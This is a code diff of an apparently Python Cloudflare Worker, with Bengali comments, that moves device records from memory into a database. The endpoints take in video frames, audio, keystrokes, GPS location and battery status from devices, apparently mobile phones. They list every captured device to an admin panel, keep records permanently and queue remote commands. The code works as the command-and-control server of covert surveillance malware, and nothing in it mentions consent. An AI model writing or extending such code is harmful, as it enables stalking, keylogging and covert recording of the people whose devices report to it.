@@ -4,11 +4,8 @@ from urllib.parse import urlparse
 import json
 import time
 
-clients = {}
-
 class Default(WorkerEntrypoint):
-    async def fetch(self, request):
-        global clients
+    async def fetch(self, request, env):
         url = urlparse(request.url)
         path = url.path.rstrip("/")
 
@@ -18,66 +15,76 @@ class Default(WorkerEntrypoint):
             "Access-Control-Allow-Headers": "Content-Type",
         }
 
-        # ১. মোবাইল থেকে ডেটা রিসিভ করা
+        # ১. ডেটা রিসিভ করা এবং D1-এ সেভ করা
         if path == "/api/update" and request.method == "POST":
             try:
                 data = await request.json()
                 client_id = data.get("id", "unknown_device")
                 now = time.time()
                 
-                if client_id not in clients:
-                    clients[client_id] = {}
+                # চেক করা ডিভাইস আগে থেকে আছে কিনা
+                existing = await env.DB.prepare("SELECT id FROM devices WHERE id = ?").bind(client_id).first()
                 
-                if "video_frame" in data:
-                    clients[client_id]["video_frame"] = data["video_frame"]
-                    clients[client_id]["video_time"] = data.get("time", "")
-                elif "audio_data" in data:
-                    clients[client_id]["audio_data"] = data["audio_data"]
-                    clients[client_id]["audio_time"] = data.get("time", "")
-                elif "keystrokes" in data:
-                    clients[client_id]["keystrokes"] = data["keystrokes"]
+                if existing:
+                    # আপডেট করা
+                    if "video_frame" in data:
+                        await env.DB.prepare("UPDATE devices SET video_frame = ?, video_time = ?, lastPing = ? WHERE id = ?").bind(
+                            data["video_frame"], data.get("time", ""), now, client_id
+                        ).run()
+                    elif "audio_data" in data:
+                        await env.DB.prepare("UPDATE devices SET audio_data = ?, audio_time = ?, lastPing = ? WHERE id = ?").bind(
+                            data["audio_data"], data.get("time", ""), now, client_id
+                        ).run()
+                    elif "keystrokes" in data:
+                        await env.DB.prepare("UPDATE devices SET keystrokes = ?, lastPing = ? WHERE id = ?").bind(
+                            data["keystrokes"], now, client_id
+                        ).run()
+                    else:
+                        await env.DB.prepare("UPDATE devices SET lat = ?, lng = ?, accuracy = ?, device = ?, browser = ?, battery = ?, charging = ?, lastSeen = ?, lastPing = ? WHERE id = ?").bind(
+                            data.get("lat"), data.get("lng"), data.get("accuracy", 0),
+                            data.get("device", "Unknown"), data.get("browser", "Unknown"),
+                            data.get("battery", "N/A"), data.get("charging", "N/A"),
+                            data.get("time", ""), now, client_id
+                        ).run()
                 else:
-                    clients[client_id].update({
-                        "id": client_id,
-                        "lat": data.get("lat"),
-                        "lng": data.get("lng"),
-                        "accuracy": data.get("accuracy", 0),
-                        "device": data.get("device", "Unknown"),
-                        "browser": data.get("browser", "Unknown"),
-                        "battery": data.get("battery", "N/A"),
-                        "charging": data.get("charging", "N/A"),
-                        "lastSeen": data.get("time", ""),
-                    })
+                    # নতুন ডিভাইস যোগ করা
+                    await env.DB.prepare("INSERT INTO devices (id, lat, lng, accuracy, device, browser, battery, charging, lastSeen, lastPing) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)").bind(
+                        client_id, data.get("lat"), data.get("lng"), data.get("accuracy", 0),
+                        data.get("device", "Unknown"), data.get("browser", "Unknown"),
+                        data.get("battery", "N/A"), data.get("charging", "N/A"),
+                        data.get("time", ""), now
+                    ).run()
                 
-                clients[client_id]["lastPing"] = now
                 return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
             except Exception as e:
                 return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})
 
-        # ২. অ্যাডমিন প্যানেলে ডিভাইস লিস্ট পাঠানো (৫ মিনিট টাইমার)
+        # ২. ডিভাইস লিস্ট (কখনো মুছবে না)
         if path == "/api/clients" and request.method == "GET":
-            now = time.time()
-            active_clients = {k: v for k, v in clients.items() if now - v.get("lastPing", now) < 300}
-            clients = active_clients
-            return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})
+            try:
+                result = await env.DB.prepare("SELECT * FROM devices").all()
+                clients = {}
+                for row in result.results:
+                    clients[row["id"]] = row
+                return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})
+            except Exception as e:
+                return Response(json.dumps({"error": str(e)}), status=500, headers={**cors_headers, "Content-Type": "application/json"})
 
-        # ৩. অ্যাডমিন থেকে কমান্ড পাঠানো
+        # ৩. কমান্ড পাঠানো
         if path == "/api/command" and request.method == "POST":
             try:
                 data = await request.json()
                 client_id = data.get("client_id")
                 command = data.get("command")
-                if client_id in clients:
-                    clients[client_id]["command"] = command
-                    return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
-                return Response(json.dumps({"error": "Device not found"}), status=404, headers={**cors_headers, "Content-Type": "application/json"})
+                await env.DB.prepare("UPDATE devices SET command = ? WHERE id = ?").bind(command, client_id).run()
+                return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
             except Exception as e:
                 return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})
 
         if request.method == "OPTIONS":
             return Response("", headers=cors_headers)
 
-        # ৪. HTML এবং PWA ফাইল সার্ভ করা
+        # ৪. HTML ফাইল সার্ভ করা
         if path in ("", "/"):
             return Response(self.read_file("admin.html"), headers={"Content-Type": "text/html; charset=utf-8"})
         
